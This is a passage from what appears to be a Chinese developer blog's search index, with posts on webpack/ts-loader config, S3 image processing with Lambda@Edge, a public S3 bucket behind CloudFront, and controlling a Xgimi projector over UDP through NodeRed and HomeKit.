class="keyword">true</span></span><br><span class="line">    <span class="comment">// 其余配置保持默认不改动</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将 ts-loader 的配置修改为：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const config: WebpackConfiguration = &#123;</span><br><span class="line">  // ... 其他配置</span><br><span class="line">  module: &#123;</span><br><span class="line">    rules: [</span><br><span class="line">      // ... 其他 loader ...</span><br><span class="line">      // 处理 ts 文件</span><br><span class="line">      &#123;</span><br><span class="line">        test: /\.tsx?$/i,</span><br><span class="line">        use: [</span><br><span class="line">          &#x27;babel-loader&#x27;,</span><br><span class="line">          &#123;</span><br><span class="line">            loader: &#x27;ts-loader&#x27;,</span><br><span class="line">            options: &#123;</span><br><span class="line"><span class="deletion">-             configFile: path.resolve(__dirname, &#x27;./tsconfig.json&#x27;),</span></span><br><span class="line"><span class="addition">+             configFile: path.resolve(__dirname, &#x27;./tsconfig-project.json&#x27;),</span></span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">        exclude: /node_modules/,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  // ... ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webpack </tag>
            
            <tag> Babel </tag>
            
            <tag> TypeScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Lambda 函数实现 AWS S3 的图片缩放、质量调整、自动 webp</title>
      <link href="/2023/07/a7f4fe8c61e9.html"/>
      <url>/2023/07/a7f4fe8c61e9.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文章只是讲实现方案，并不会涉及具体的代码上线，如果你想参考代码以及详细的部署流程，可以参考该项目：<a href="https://github.com/EsunR/s3-image-handler">s3-image-handler</a></p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>不同于国内的很多对象存储服务，AWS S3 并不提供图像处理的服务，需要用户使用 Lambda 函数或者 EC2 搭建图片缩放服务，这就使用用户有比较高的使用门槛了，但是相当于国内云服务厂商提供的黑盒图像处理服务，AWS Lambda 也有着透明、高兼容度、高可编程性的优势。</p><p>首先我们要明确一下最终的实现需求，需要达到以下的功能：</p><ul><li>请求携带图像处理参数访问图片后返回相应的处理好的图片；</li><li>处理过的图片要存储到 S3 上，防止重复的图片处理请求；</li><li>Lambda 函数要部署到全球边缘节点，而不只是一个固定的地区，以加快用户的调用速度；</li><li>支持 CloudFront 缓存，加快用户访问；</li><li>需要支持自动转换格式，如果用户的浏览器支持 webp 则自动请求 webp 资源</li></ul><p>那么接下来我们将逐步实现它。</p><h1 id="2-先来个简单的架构吧"><a href="#2-先来个简单的架构吧" class="headerlink" title="2. 先来个简单的架构吧"></a>2. 先来个简单的架构吧</h1><p>我们先假设搭建了一个图片存储服务，那么当用户每次发起请求时，请求都会经过一个 <code>Image Handler</code> 服务（我们暂不考虑其具体实现），其相当于一个中间人的角色，如果访问的图片存在于 S3 上，那么 <code>Image Handler</code> 就将图片原封不动的返回给用户。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251653285.png" alt=""></p><p>但是如果我们为图片添加一些格式转换的参数，比如说请求 <code>image.jpg__op__format,f_webp</code> 代表获取 <code>image.jpg</code> 的 webp 格式的图片，那么经过 <code>Image Handler</code> 这个中间服务时候就会执行如下流程：</p><ol><li>Image Handler 尝试获取 <code>image.jpg__op__format,f_webp</code> 文件，结果文件不存在；</li><li>Image Handler 去除格式转换参数，请求 <code>image.jpg</code> 文件，成功获取文件；</li><li>Image Handler 解析格式转换参数，并调用图像处理工具对图片进行格式转换；</li><li>Image Handler 将转换好格式的图片上传至 S3；<ol><li>此时，S3 会同时存在 <code>image.jpg</code> 和 <code>image.jpg__op__format,f_webp</code> 两个文件。</li></ol></li><li>Image Handler 重定向用户请求，让用户重新获取 S3 资源。</li></ol><p>整体流程图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251722922.png" alt=""></p><p>那么接下来我们就由简入繁，尝试实现以下这套架构。</p><h1 id="3-使用-API-Gateway-Lambda-实现-ImageHandler"><a href="#3-使用-API-Gateway-Lambda-实现-ImageHandler" class="headerlink" title="3. 使用 API Gateway + Lambda 实现 ImageHandler"></a>3. 使用 API Gateway + Lambda 实现 ImageHandler</h1><h3 id="初始架构"><a href="#初始架构" class="headerlink" title="初始架构"></a>初始架构</h3><p>上节我们文中提到的 <code>Image Hanlder</code> 就可以使用 Lambda 函数来实现，我们可以加上一个 API GateWay 服务来用于触发 Lambda 函数，那么架构图就会变为：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251811317.png" alt=""></p><p>这个与我们上面的架构图差别不大，只是将 <code>Image Handler</code> 由 Lambda 和 API Gateway 相结合而实现。其中，API Gateway 只作为 Lambda 函数的触发器，用户请求图片时就直接请求 API Gateway 的访问 url，并将访问文件的路径作为 path 参数拼接入 url，如 <code>api-gateway?path=image.jpg__op__format,f_webp</code>，然后 Lambda 函数收到会从 API Gateway 发来的事件，并提取 url query 中的文件路径，执行获取图像、处理图像、返回图像等上节我们提到的操作。</p><blockquote><p>你可能会有顾虑，如果参数越来越多，在 s3 上保存的对象文件名（也就是 key）会不会因为过长而无法处理？其实不必过分担忧，s3 标称可以允许 1024 个字符长度的 key 值，经过测试，就算文本是纯中文也支持300~350 个中文，而操作系统的最长文件名一般为 255 个，并不足矣达到让 S3 都无法处理文件名的地步。</p></blockquote><h3 id="优化架构"><a href="#优化架构" class="headerlink" title="优化架构"></a>优化架构</h3><p>但是我们会发现，如果用户直接请求 API Gateway 的话，那么每次请求都会触发 Lambda 函数的执行，而 Lambda 函数检查文件是否存在的这一行为也会消耗大量的时间。</p><p>因此我们需要优化一下架构：首先让用户请求 S3，如果 S3 文件不存在就使用 307 临时重定向，让用户访问 API Getway 的 url，然后再触发 Lambda 函数。此时可以确定的是用户访问的是不存在于 S3 的图片，因此 Lambda 函数无需检查图片是否存在，直接从 S3 中获取原始图片并处理，处理完成后使用 301 永久重定向让用户重新从 S3 获取由 Lambda 处理好的图片，下次请求用户遍也无需经过 Lambda 函数，这样大大提升了用户的访问效率。修改后的架构图如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251821604.png" alt=""></p><h3 id="架构实现"><a href="#架构实现" class="headerlink" title="架构实现"></a>架构实现</h3><p>上面的架构在 Github 上有完整的实现参考：<a href="https://github.com/sagidM/s3-resizer/tree/master">s3-resizer</a>，与上面描述唯一不一样的为图像处理参数的处理，该函数只专注于图片缩放，想要其他的功能需要自己实现。</p><p>需要值得注意的一点是，S3 如果查找不到图片返回 307 重定向的这个行为，S3 默认是无法实现的，需要开启 S3 的 <strong>静态网站托管服务</strong>，这样就可以改写资源 404 时的行为，让 S3 重定向到 API Gateway，具体<br>的配置流程可以在 <a href="https://github.com/sagidM/s3-resizer/tree/master">s3-resizer</a> 项目的 README 中查看。</p><h3 id="架构缺陷"><a href="#架构缺陷" class="headerlink" title="架构缺陷"></a>架构缺陷</h3><p>其实这个架构是有明显的缺陷的，总结为以下几点：</p><ul><li><p>开启静态网站托管后，AWS 不支持 https 访问，要想开启 https 需要自己的域名，<a href="https://github.com/sagidM/s3-resizer/issues/7">参考</a>；</p></li><li><p>过多的重定向，如果某个图片不存在，则需要三次重定向才能获取到图片，这个过程在高并发的资源请求下简直是灾难；</p></li><li><p>CloudFront 加速比较麻烦；</p></li><li><p>Lambda 函数和 API Getway 只能部署在固定的地区，如果用户请求来自其他地区，函数响应速度将会收到影响；</p></li><li><p>这个架构无法实现自动 webp。</p><p>如果不需要优化多区域访问速度的话，这个架构已经可以应对一些简单的项目了，但是多次重定向、Lambda 函数无法全球化的问题确实是比较致命的，因此我们接下来将探讨另外一种实现方案，可以把上面的问题都解决掉。</p></li></ul><h1 id="3-使用-Lambda-Edge-实现-ImageHandler"><a href="#3-使用-Lambda-Edge-实现-ImageHandler" class="headerlink" title="3. 使用 Lambda@Edge 实现 ImageHandler"></a>3. 使用 Lambda@Edge 实现 ImageHandler</h1><h3 id="Lambda-Edge-简介"><a href="#Lambda-Edge-简介" class="headerlink" title="Lambda@Edge 简介"></a>Lambda@Edge 简介</h3><p>Lambda@Edge 是 AWS 的边缘计算服务，不同于普通的 Lambda 函数：普通的 Lambda 函数只能部署在单个区域的节点上，然后用户通过设置的触发器（如 API Gateway）来触发该函数；而 Lambda@Edge 可以借助 CloudFront 部署在全球的边缘节点上，当用户访问某个与其物理位置最接近的 CloudFront 分配时，就会触发部署在其上面的 Lambda@Edge 函数。</p><p>由于 Lambda@Edge 完全依托于 CloudFront，其触发流程也是围绕着用户请求某个 CloudFront 节点的生命周期，具体如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311108474.png" alt=""></p><ul><li>当用户访问到某个 CloudFront 分配且在 CloudFront 检查缓存之前，首先会触发 viewer request；</li><li>当 CloudFront 没有发现缓存资源时候，按照回源规则向上访问时（如当 S3 上存放的图片没有被 CloudFront 缓存，那么就会回源访问到 S3），就会触发 origin request；</li><li>当 CloudFront 收到来自源的响应之后、在缓存行为发生之前，会触发 origin response；</li><li>当 CloudFront 将用户请求的资源返回前，会触发 viewer response。</li></ul><p>Lambda@Edge 可以部署在以上四个 CloudFront 资源请求的时间点，<strong>并且可以在 request 阶段修改用户的请求，在 response 阶段修改服务器返回的响应</strong>。</p><p>但是 Lambda@Edge 是有部署条件的：</p><ul><li><strong>只有弗吉尼亚北部（us-east-1）上的 Lambda 函数才能部署到 CloudFront 上</strong>，成为 Lambda@Edge 函数，其他地区的函数触发器都不包含 CloudFront；</li><li>viewer request 和 viewer response 的资源配额较小，编程时需要额外注意，响应时长不得超过 5s，内存分配不得超过 128M，Lambda 及其依赖包大小不得超过 1M；</li><li>如果需要篡改响应，那么只能返回给客户端纯文本或者 base64 编码；</li><li>由于函数经过 CloudFront，到 OriginResponse 后就会被移出掉客户端的请求头字段，如果需要透传，则需要手动在 CloudFront 的 <code>行为</code> 面板中单独配置 <code>源请求策略</code>；</li><li>更多功能限制可以查看 <a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/edge-functions-restrictions.html">这里</a>；</li><li>更多配额限制可以查看 <a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/cloudfront-limits.html">这里</a>。</li></ul><h2 id="使用-Lambda-Edge-实现-ImageHandler"><a href="#使用-Lambda-Edge-实现-ImageHandler" class="headerlink" title="使用 Lambda@Edge 实现 ImageHandler"></a>使用 Lambda@Edge 实现 ImageHandler</h2><p>首先，我们要将 S3 接入 CloudFront，这样才能进一步接入 Lambda@Edge，关于具体如何接入，可以参考 <a href="https://blog.esunr.site/2023/07/cd2440f9b860.html">这篇文章</a>。</p><p>将 S3 接入 CloudFront 之后，我们再来看一下 CloudFront 的工作机制，与所有的 CDN 服务一样，当 CloudFront 没有缓存时，就会触发回源，如果有缓存且缓存没有失效，就不会触发回源，而是直接从服务器节点获取资源：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311403801.png" alt=""></p><p>那么 Lambda@Edge 函数的四个触发时间点，就分布在下图所示的四个阶段：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311433055.png" alt=""></p><p>以上的流程图中演示的是用户请求了一张 S3 存在的图片，那么假如用户请求了一张携带了图片处理参数的图片（假设携带了参数的图片不存在于 S3 上），当请求会回源到 S3，然后触发 403 Forbidden（PS：S3 没有 404 的状态码，无权限和文件不存在都是 403），我们所要做的就是 <strong>修改这次回源响应</strong> ，让回源返回的是一张处理好的图片，而不是 403 状态码。</p><p>经过上面的流程分析，很容易发现最合适操作的位置就是 <code>origin response</code> 阶段，因为在这一阶段可以直接获取到 S3 的回源结果：如果是一个 200 的状态码，就说明用户请求的是原始图片，或者带参数的图片已经存在于 S3 中；反之，如果是一个 403 状态码，就说明图片不存在，此时 Lambda 函数就开始进行获取原图、处理图片、上传图片、返回响应的这一系列行为。</p><p>以用户请求 <code>image.jpg__op__format,f_webp</code> 这一携带了图片处理参数的请求为例，经历了如下流程：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311512282.png" alt=""><br>如果用户请求了一个原始图片不存在，但是携带了图片操作参数的图片（如 <code>error.jpg__op__format,f_webp</code>），<code>origin response</code> 阶段部署的 Lambda 函数依旧会工作，但由于 Lambda 函数并不确定原始图片是否存在，仍然会尝试二次向 S3 请求原始图片来确认，如果原始图片确实不存在，那么 Lambda 函数则仍返回原响应（403），工作流程如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311531640.png" alt=""></p><h2 id="添加自动-webp-的功能"><a href="#添加自动-webp-的功能" class="headerlink" title="添加自动 webp 的功能"></a>添加自动 webp 的功能</h2><p>webp 格式在提升 Web 图片传输效率上有很大的优势，能将图片进一步压缩，不仅节省 S3 的存储空间以及 CloudFront 的流量消耗，更能页面更快的展现给用户，在上面的示例中，我们请求 <code>image.jpg__op__format,f_webp</code> 的目的就是为了指定获取 webp 的图片而不是原图。</p><p>但是对于 webp 的支持上，Safria 浏览器极其拉胯，直到 2022 年的 Safria 16 才 <a href="https://caniuse.com/webp">完全支持</a>，为了某一小撮浏览器的兼容性，我们并不能大放手脚的全站使用 webp。从前端开发来讲，虽然完全可以从前端写一个判断函数来判断用户浏览器是否兼容 webp 而编程式的来获取不同格式的图片，但这样做并不是完美的，比如 SSR 场景来说，在客户端和服务端都要写两套判断代码，简直徒增工作量。</p><p>那么最优雅的解决方案还是从我们刚才写的 Lambda 函数入手，新增一个 <code>f_auto</code> 参数，比如当用户请求 <code>image.jpg__op__format,f_auto</code> 时，通过用户的 request header 的 accept 字段来判断用户的浏览器是否支持 webp，如果支持则返回格式为 webp 的图片，否则返回原图。设想很美好，但是当我们按照这个思路去完善 origin response 阶段部署的 Lambda 函数时却很容易发现走不通，会出现两个致命的问题：</p><ol><li>从 origin response 阶段的 Lambda 函数事件中，并不获取到 accept 请求头，因为该请求是从 CloudFront 转发过来的，转发过程中 CloudFront 会移除掉部分客户端请求头。</li><li>就算我们在 CloudFront 中进行了配置，允许 accept 透传到 origin response 阶段，如果判断出来用户支持 webp，那么就会生成一张名为 <code>image.jpg__op__format,f_auto</code> 格式为 webp 的图片上传到 S3。但当下一个用户浏览器不支持 webp 时，请求的仍为 <code>image.jpg__op__format,f_auto</code> 就会获取到由上个用户生成的 webp 格式的图片。也就是说，在 origin response 阶段写的自动格式判断逻辑只能满足首个用户的浏览器需求，后续的用户请求过来的图片都是首个用户触发生成的图片。</li></ol><p>因此，我们不可能通过完善 origin response 的 Lambda 函数来实现自动 webp 的功能。但是我们还可以考虑部署于其他位置的 Lambda@Edge 函数来实现这一功能，还记得 Lambda@Edge 的能力吗？不仅可以修改回源响应，<strong>更能在 request  阶段修改用户请求</strong>。假如我们在 request 阶段判断用户的浏览器是否支持 webp，如果支持的话就将用户请求改为 <code>image.jpg__op__format,f_webp</code>，反之则将用户请求改为 <code>image.jpg</code> 使用户请求原图，这样后续 origin response 处部署的 Lambda 函数就仍只需要关注图片处理参数即可。</p><p>但是可以修改用户请求的时间点有两处，一处是 viewer request，另一处则是 origin request：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311556050.png" alt=""></p><p>具体应该使用哪个呢？答案是 viewer request。</p><p>因为 origin request 只会在 CloudFront 不存在缓存进行回源查找时才会触发，假如自动 webp 的逻辑放在此处，一旦某个使用了支持 webp 格式浏览器的用户访问了携带了 <code>f_auto</code> 参数的图片，经过图片处理函数的操作后 CloudFront 就会缓存上 webp 格式的图片；后续假如来了一个使用不支持 webp 格式浏览器的用户访问了该图片，因为存在缓存，所以回源过程并不会触发， origin request 自然也不会触发，该用户只会获取到 CloudFront 上缓存的 webp 格式的图片。</p><p>但是 viewer request 却不同，因为其位于用户访问 CloudFront 的阶段上，因此不论 CloudFront 是否有目标图片的缓存，viewer request 始终会触发，那么我们只需要在 viewer request 阶段部署一个 Lambda 函数来根据用户的请求头判断用户使用的浏览器是否支持 webp，根据判断结果修改用户的请求 uri，就可以实现自动 webp 的功能，具体流程如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307311648469.png" alt=""></p><h2 id="架构优化"><a href="#架构优化" class="headerlink" title="架构优化"></a>架构优化</h2><p>上面只是演示了最基础的实现方案，虽然已经可以投入使用了，但这个架构还有一定的优化空间，具体如下，可以进行参考：</p><ul><li>在 origin response 处理完图片后，由于收到限制，只能将返回的图片编码为 base64 返回，浏览器必须等待所有的数据都返回才会渲染图片，而不是像普通图片那样在请求加载时浏览器就已经开始渲染图片。这个对于弱网环境效果尤为明显，因此建议在 origin response 处理后，返回的响应字段里添加 <code>cache-control: no-cache, no-store, must-revalidate</code>，这样 CloudFront 上就不会缓存首次请求触发的 base64 图片，而是等待缓存下次请求的正常图片。</li><li>origin response 改写的响应是有大小限制的，base64 编码后的大小不得大于 1.33M。如果转换后的图片大小超过这个限制，可以使用重定向，让服务端重新请求资源，此时请求的就是从 S3 中拿的资源了。</li><li>在图片处理前，在 Lambda 函数中会去尝试下载原始图片，应该尽量减少这一行为的触发，除了单纯的判断 S3 上并不存在已经处理的图片外，还应该判断用户的请求是否是获取图片的请求、请求是否携带了正确的图片处理参数等。</li><li>S3 无法查找图片和权限不足返回的都是 403 状态码，如果某个路径下的资源不允许普通用户读取，那么图片处理函数中一定要对其进行特殊处理，不能一昧的把 403 作为图片不存在的状态码来处理，否则会造成权限泄露。推荐在使用该架构时，bucket 中所有内容的权限都是统一的。</li></ul><blockquote><p> 这些优化项在 <a href="https://github.com/EsunR/s3-image-handler">s3-image-handler</a> 已经处理。</p></blockquote><h2 id="架构缺陷-1"><a href="#架构缺陷-1" class="headerlink" title="架构缺陷"></a>架构缺陷</h2><p>虽然当前的架构已经满足了我们的需求，但是其还是存在着一些无法避免的缺陷，需要开发者知悉：</p><ul><li>权限缺陷：需要注意防止越权操作；</li><li>性能缺陷：图片过大处理时间会很长；</li><li>无法避免的上传时长等待：图片转换后 Lambda 函数需要等待上传函数执行完成才能返回给客户端响应，由于 Lambda 函数的限制，将上传操作放进异步线程先返回客户端响应会导致上传行为失败（实际上异步的上传任务是被挂起了，但是在高并发场景下会因为 Lambda 函数的动态扩展而销毁上传任务）；</li></ul><h1 id="参考引用"><a href="#参考引用" class="headerlink" title="参考引用"></a>参考引用</h1><ul><li><a href="https://aws.amazon.com/cn/blogs/networking-and-content-delivery/resizing-images-with-amazon-cloudfront-lambdaedge-aws-cdn-blog/">Resizing Images with Amazon CloudFront &amp; Lambda@Edge | AWS CDN Blog</a></li><li><a href="https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-edge-how-it-works.html">Get started creating and using Lambda@Edge functions</a></li><li><a href="https://dashbird.io/blog/aws-image-resize-with-lambda-and-s3/">Serverless with AWS – Image resize on-the-fly with Lambda and S3</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aws </tag>
            
            <tag> lambda </tag>
            
            <tag> lambda@edge </tag>
            
            <tag> s3 </tag>
            
            <tag> webp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建 AWS S3 公共存储桶并添加 CloudFront CDN 加速域名</title>
      <link href="/2023/07/cd2440f9b860.html"/>
      <url>/2023/07/cd2440f9b860.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-创建-AWS-S3-存储桶"><a href="#1-创建-AWS-S3-存储桶" class="headerlink" title="1. 创建 AWS S3 存储桶"></a>1. 创建 AWS S3 存储桶</h1><p>进入 <a href="https://s3.console.aws.amazon.com/s3/home">S3 控制台</a>，点击 <code>创建存储桶（Bucket）</code>，地区优先选择用户多的位置，输入桶名称后直接点击确认创建。</p><p>此时我们已经可以为创建好的存储桶上传文件了，点击上传的文件对象查看详情，复制对象 URL 到浏览器中：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20230725141918.png" alt=""></p><p>然后会发现页面 403 Forbidden 的警告，因为我们默认设置的存储桶是没有公共读权限的，截下来需要为创建的 Bucket 设置公共读权限。</p><h1 id="2-设置存储桶权限"><a href="#2-设置存储桶权限" class="headerlink" title="2. 设置存储桶权限"></a>2. 设置存储桶权限</h1><p>点击 Bucket 列表中刚才创建的 Bucket，点击进入详情后选择进入权限面板，编辑 <code>屏蔽公共访问权限（存储桶设置）</code>，取消选中所有选项并保存更改：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251356944.png" alt=""></p><p>继续停留在权限面板，编辑 <code>存储桶策略</code>，并输入以下权限（注意将 <code>your-bucket-name</code> 改为你的存储桶名称）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;Statement1&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Action&quot;: &quot;s3:GetObject&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;arn:aws:s3:::your-bucket-name/*&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后保存，此时，你的存储桶会拥有公共读的权限，Bucket 列表中的访问会出现 <code>公开</code> 的警告：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251402414.png" alt=""></p><h1 id="3-创建-CloudFront-分配"><a href="#3-创建-CloudFront-分配" class="headerlink" title="3. 创建 CloudFront 分配"></a>3. 创建 CloudFront 分配</h1><p>然后进入 <a href="https://us-east-1.console.aws.amazon.com/cloudfront/v3/home">CloudFront 控制台</a>创建一个新的分配，并选择 <code>源域</code> 为 S3 刚才创建的 Bucket 所分配的域，名称可随意填写一个备注名，其他使用默认配置即可：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251406615.png" alt=""></p><blockquote><p>点击确认时可能会询问是否添加安全防护，选择不添加即可</p></blockquote><p>进入刚才创建的 CloudFront 分配，查看详细信息中分配的域名，你就可以使用该域名访问刚才创建的 Bucket 的内容了。</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251423281.png" alt=""></p><p>比如，原来使用 S3 分配的域名访问文件的地址为 <code>https://image.s3.us-west-1.amazonaws.com/avatar.jpeg</code>，使用 CloudFront 分配的 CDN 加速域名就会变为 <code>https://xxxxxxxx.cloudfront.net/avatar.jpeg</code>。</p><p>可以看出使用 CloudFront 分配的加速域名与使用 S3 分配的域名有明显的速度差距，并且支持了 http2：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251427416.png" alt="使用 S3 域名"></p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20230725142820.png" alt="使用 CloudFront 分配域名进行访问"></p><h1 id="4-使用自定义域名"><a href="#4-使用自定义域名" class="headerlink" title="4. 使用自定义域名"></a>4. 使用自定义域名</h1><blockquote><p>由于这里需要域名就不详细描述了，只提供设置方法</p></blockquote><p>如果要使用自己的域名，可以在 CloudFront 分配的详情面板中设置 <strong>备用域名</strong>，设置成功后即可使用自己的域名访问 S3 的文件，并享有 CloudFront 的加速。</p><h1 id="5-清理缓存"><a href="#5-清理缓存" class="headerlink" title="5. 清理缓存"></a>5. 清理缓存</h1><p>CloudFront 默认会缓存文件 24 小时，也就是说，如果你 S3 上的某一个已经缓存在 CloudFront 上的 <strong>同名资源</strong> 在 24 小时内有所更新，那么使用 CloudFront 域名访问该资源文件时仍会获取到旧的、被缓存的那一个版本的文件。</p><p>最好的解决方案是上传文件时为文件添加哈希后缀，但如果需要手动清理缓存资源则可以进入到 CloudFront 上的 <code>失效</code> 面板，创建一个新的失效：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202307251436231.png" alt=""></p><p>如果想要清理所有缓存内容，规则中输入 <code>/*</code> 即可删除所有缓存资源。</p>]]></content>
      
      
      <categories>
          
          <category> 云原生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWS </tag>
            
            <tag> S3 </tag>
            
            <tag> CloudFront </tag>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极米投影仪通过 HomeAssistant 与 NodeRed 接入 Homekit</title>
      <link href="/2023/07/f781387dffc0.html"/>
      <url>/2023/07/f781387dffc0.html</url>
      
        <content type="html"><![CDATA[<p>是不是每次都找不到遥控器而烦恼？是不是想要语音控制投影仪的关闭和开启？</p><p>如果你是苹果用户，那么本文将教你实现如何让极米投影仪（其他电视设备同理）接入到苹果 HomeKit 生态，实现搭配 HomePod 使用 Siri 唤醒或关闭投影仪，并且可以直接使用 IOS 集成在系统控制中心的电视遥控器来直接控制投影仪，超级方便！</p><h1 id="1-实现思路"><a href="#1-实现思路" class="headerlink" title="1. 实现思路"></a>1. 实现思路</h1><p>极米投影仪类似的设备支持使用 APP 在局域网环境下进行设备操控，这实际上就是通过 APP 在向局域网中的极米投影仪的设备 IP 发送一个 <strong>UDP 数据包</strong>，当设备收到请求后就能执行相对应的操作了，如调节音量、方向控制等。</p><p>我们可以通过抓包去获取 APP 向局域网设备发送的  UDP 数据包，获取到具体的 API 规范。好在论坛已经有大佬整理出来了(<a href="https://bbs.hassbian.com/thread-4998-1-1.html">原文</a>)，具体如下：</p><p>一套是复杂指令，一套是简单的按键输入，所有指令均是通过upd连接到目标机器上，复杂api的端口是16750，简单按键api的端口是16735。</p><p>复杂指令内容如以下格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;action&quot;:20000,&quot;controlCmd&quot;:&#123;&quot;delayTime&quot;:0,&quot;mode&quot;:6,&quot;time&quot;:0,&quot;type&quot;:0&#125;,&quot;msgid&quot;:&quot;2&quot;&#125;</span><br></pre></td></tr></table></figure><p>简单指令就只有一段文本（并不是 JSON 结构体），如 <code>KEYPRESSES:116</code> 代表电源按键，其他的按键及其对应的指令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;power&quot; =&gt; &#x27;KEYPRESSES:116&#x27;,</span><br><span class="line">&quot;vol+&quot; =&gt; &quot;KEYPRESSES:115&quot;,</span><br><span class="line">&quot;vol-&quot; =&gt; &quot;KEYPRESSES:114&quot;,</span><br><span class="line">&quot;menu&quot; =&gt; &quot;KEYPRESSES:139&quot;,</span><br><span class="line">&quot;back&quot; =&gt; &quot;KEYPRESSES:48&quot;,</span><br><span class="line">&quot;pause&quot; =&gt; &quot;KEYPRESSES:49&quot;,</span><br><span class="line">&quot;paly&quot; =&gt; &quot;KEYPRESSES:49&quot;,</span><br><span class="line">&quot;down&quot; =&gt; &quot;KEYPRESSES:38&quot;,</span><br><span class="line">&quot;up&quot; =&gt; &quot;KEYPRESSES:36&quot;,</span><br><span class="line">&quot;left&quot; =&gt; &quot;KEYPRESSES:50&quot;,</span><br><span class="line">&quot;right&quot; =&gt; &quot;KEYPRESSES:37&quot;,</span><br><span class="line">&quot;home&quot; =&gt; &quot;KEYPRESSES:35&quot;,</span><br></pre></td></tr></table></figure><p>有了 API 后就要思考如何调用这些 API，NodeRed 就是一个很好用的工具。</p><p>NodeRed 是一个基于浏览器的可视化工具，如果你使用过苹果的 <strong>快捷指令</strong> APP，那么就很容易理解 NodeRed 的操作。它可以通过拖拽节点方式构建应用程序，并通过连接它们来定义其行为，帮助用户轻松创建流程，并使设备、API和在线服务互相协作，在 IoT 领域被很多人使用。</p><p>举例来说，我们只需要简答的拖拽一个 <code>inject</code> 节点作为触发节点，再拖拽一个 <code>udp</code> 节点并双击节点进行配置，就可以将 inject 节点中填写的 payload 信息作为 udp 报文内容发送给局域网中的某一设备：</p><p><img 